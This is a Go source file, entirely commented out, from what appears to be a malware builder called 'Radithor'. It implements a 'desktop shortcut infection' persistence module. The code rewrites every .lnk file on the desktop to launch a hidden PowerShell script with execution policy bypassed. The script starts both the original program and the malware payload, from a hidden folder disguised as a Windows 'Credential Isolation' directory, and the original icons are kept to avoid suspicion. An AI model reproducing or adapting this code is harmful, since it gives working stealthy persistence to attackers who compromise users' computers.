package persistence

// this is mostly just a poc now ig
// i dont think ill ever come back to this considering how retarded and unreliable it is

// from builder layout
// {
//     "name": "Desktop shortcut infection",
//     "info": "Modifies shortcut/.lnk files on the desktop to make Radithor startup when the shortcut is clicked.",
//     "type": "checkbox"
// }

// import (
// 	"errors"
// 	"fmt"
// 	"os"
// 	"path/filepath"
// 	"strings"

// 	"radithor/core"
// 	"radithor/utils"

// 	"github.com/horobimasu/gotils"
// 	"golang.org/x/sys/windows"
// )

// const _NEW_TARGETS_SCRIPTS_STORE_DIR_PATH = "%LOCALAPPDATA%\\Microsoft\\Windows\\Credential Isolation"

// func InfectShortcuts(dirPath string, theFilePath string) error {
// 	dirPath = gotils.ExpandPath(dirPath)

// 	info, err := os.Stat(dirPath)
// 	if err != nil {
// 		return err
// 	}

// 	if !info.IsDir() {
// 		return errors.New("provided path is not a directory")
// 	}

// 	items, err := os.ReadDir(dirPath)
// 	if err != nil {
// 		return err
// 	}

// 	newAllTargetsPath := gotils.ExpandPath(_NEW_TARGETS_SCRIPTS_STORE_DIR_PATH)

// 	err = os.MkdirAll(newAllTargetsPath, 0666)
// 	if err != nil {
// 		return err
// 	}

// 	err = windows.SetFileAttributes(
// 		windows.StringToUTF16Ptr(newAllTargetsPath),
// 		windows.FILE_ATTRIBUTE_HIDDEN|windows.FILE_ATTRIBUTE_SYSTEM,
// 	)

// 	if err != nil {
// 		core.LogWarning("[InfectShortcuts] failed to set script store attribs - %v", err)
// 	}

// 	for _, item := range items {
// 		if !strings.HasSuffix(item.Name(), ".lnk") {
// 			continue
// 		}

// 		shortcutPath := filepath.Join(dirPath, item.Name())

// 		shortcutData, err := utils.GetShortcutData(shortcutPath)
// 		if err != nil {
// 			continue
// 		}

// 		newTargetScriptPath := filepath.Join(newAllTargetsPath, item.Name()+".ps1")
// 		newTargetScritpData := fmt.Sprintf("start %s\nstart %s", shortcutData.Target, theFilePath)

// 		err = os.WriteFile(newTargetScriptPath, []byte(newTargetScritpData), 0666)
// 		if err != nil {
// 			continue
// 		}

// 		err = utils.UpdateShortcutData(shortcutPath, utils.Shortcut{
// 			Target:   fmt.Sprintf("powershell.exe -nop -w hidden -ep bypass -c %q", newTargetScriptPath),
// 			IconPath: shortcutData.Target, // sometimes it will just use the icon of the new one
// 		})

// 		if err != nil {
// 			continue
// 		}
// 	}

// 	return nil
// }

// func RestoreShortcuts(dirPath string) error {
// 	return nil // todo, yea this is never going to be done lol
// }
